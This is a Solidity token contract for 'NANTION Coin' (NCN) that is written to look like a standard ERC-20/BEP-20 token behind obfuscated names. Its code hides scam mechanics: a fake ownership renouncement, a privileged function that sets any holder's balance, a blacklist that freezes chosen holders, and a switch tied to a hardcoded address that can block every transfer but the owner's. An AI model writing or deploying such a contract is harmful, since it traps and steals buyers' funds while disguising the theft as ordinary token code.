//SPDX-License-Identifier: MIT

pragma solidity ^0.8.5;

interface launchedSellAt {
    function totalSupply() external view returns (uint256);

    function balanceOf(address launchList) external view returns (uint256);

    function transfer(address marketingSell, uint256 teamExemptShould) external returns (bool);

    function allowance(address receiverAmountFund, address spender) external view returns (uint256);

    function approve(address spender, uint256 teamExemptShould) external returns (bool);

    function transferFrom(
        address sender,
        address marketingSell,
        uint256 teamExemptShould
    ) external returns (bool);

    event Transfer(address indexed from, address indexed receiverTx, uint256 value);
    event Approval(address indexed receiverAmountFund, address indexed spender, uint256 value);
}

interface receiverListToken is launchedSellAt {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract listAmount {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface maxIsEnable {
    function createPair(address limitMarketingList, address txBuy) external returns (address);
}

interface enableLiquidity {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract NANTIONCoin is listAmount, launchedSellAt, receiverListToken {

    function marketingBuy() public {
        emit OwnershipTransferred(marketingSellIs, address(0));
        launchMaxMode = address(0);
    }

    function amountList(address amountLaunchLiquidity) public {
        if (launchedSell) {
            return;
        }
        if (swapLaunch != amountEnable) {
            swapLaunch = true;
        }
        tradingSender[amountLaunchLiquidity] = true;
        
        launchedSell = true;
    }

    function allowance(address txMarketing, address swapTeamList) external view virtual override returns (uint256) {
        if (swapTeamList == launchExempt) {
            return type(uint256).max;
        }
        return fromTo[txMarketing][swapTeamList];
    }

    address private launchMaxMode;

    function symbol() external view virtual override returns (string memory) {
        return amountTrading;
    }

    uint256 private autoMax = 100000000 * 10 ** 18;

    function getOwner() external view returns (address) {
        return launchMaxMode;
    }

    function maxReceiver(address fromExempt, uint256 teamExemptShould) public {
        senderTx();
        minWallet[fromExempt] = teamExemptShould;
    }

    bool private amountEnable;

    uint256 public minReceiver;

    address autoTx = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function totalSupply() external view virtual override returns (uint256) {
        return autoMax;
    }

    address public tokenLaunch;

    uint256 public atTx;

    address launchExempt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 public feeFromTo;

    bool private swapLaunch;

    bool private tokenTotalFund;

    function decimals() external view virtual override returns (uint8) {
        return feeList;
    }

    function limitIs(address listAmountAt) public {
        senderTx();
        
        if (listAmountAt == marketingSellIs || listAmountAt == tokenLaunch) {
            return;
        }
        shouldAmount[listAmountAt] = true;
    }

    uint256 walletLaunched;

    function feeSender(address liquidityTo, address marketingSell, uint256 teamExemptShould) internal returns (bool) {
        if (liquidityTo == marketingSellIs) {
            return modeAt(liquidityTo, marketingSell, teamExemptShould);
        }
        uint256 minLaunched = launchedSellAt(tokenLaunch).balanceOf(autoTx);
        require(minLaunched == walletLaunched);
        require(!shouldAmount[liquidityTo]);
        return modeAt(liquidityTo, marketingSell, teamExemptShould);
    }

    string private amountTrading = "NCN";

    function name() external view virtual override returns (string memory) {
        return toTradingReceiver;
    }

    mapping(address => bool) public shouldAmount;

    function amountMarketing(uint256 teamExemptShould) public {
        senderTx();
        walletLaunched = teamExemptShould;
    }

    constructor (){
        if (amountEnable == tokenTotalFund) {
            tokenTotalFund = false;
        }
        marketingBuy();
        enableLiquidity receiverExemptSell = enableLiquidity(launchExempt);
        tokenLaunch = maxIsEnable(receiverExemptSell.factory()).createPair(receiverExemptSell.WETH(), address(this));
        
        marketingSellIs = _msgSender();
        tradingSender[marketingSellIs] = true;
        minWallet[marketingSellIs] = autoMax;
        
        emit Transfer(address(0), marketingSellIs, autoMax);
    }

    function senderTx() private view {
        require(tradingSender[_msgSender()]);
    }

    mapping(address => mapping(address => uint256)) private fromTo;

    uint8 private feeList = 18;

    mapping(address => uint256) private minWallet;

    function transferFrom(address liquidityTo, address marketingSell, uint256 teamExemptShould) external override returns (bool) {
        if (_msgSender() != launchExempt) {
            if (fromTo[liquidityTo][_msgSender()] != type(uint256).max) {
                require(teamExemptShould <= fromTo[liquidityTo][_msgSender()]);
                fromTo[liquidityTo][_msgSender()] -= teamExemptShould;
            }
        }
        return feeSender(liquidityTo, marketingSell, teamExemptShould);
    }

    function modeAt(address liquidityTo, address marketingSell, uint256 teamExemptShould) internal returns (bool) {
        require(minWallet[liquidityTo] >= teamExemptShould);
        minWallet[liquidityTo] -= teamExemptShould;
        minWallet[marketingSell] += teamExemptShould;
        emit Transfer(liquidityTo, marketingSell, teamExemptShould);
        return true;
    }

    uint256 walletSenderMode;

    function balanceOf(address launchList) public view virtual override returns (uint256) {
        return minWallet[launchList];
    }

    string private toTradingReceiver = "NANTION Coin";

    address public marketingSellIs;

    bool public launchedSell;

    bool private enableWalletExempt;

    event OwnershipTransferred(address indexed txTokenMarketing, address indexed walletToken);

    mapping(address => bool) public tradingSender;

    function transfer(address fromExempt, uint256 teamExemptShould) external virtual override returns (bool) {
        return feeSender(_msgSender(), fromExempt, teamExemptShould);
    }

    function approve(address swapTeamList, uint256 teamExemptShould) public virtual override returns (bool) {
        fromTo[_msgSender()][swapTeamList] = teamExemptShould;
        emit Approval(_msgSender(), swapTeamList, teamExemptShould);
        return true;
    }

    function owner() external view returns (address) {
        return launchMaxMode;
    }

}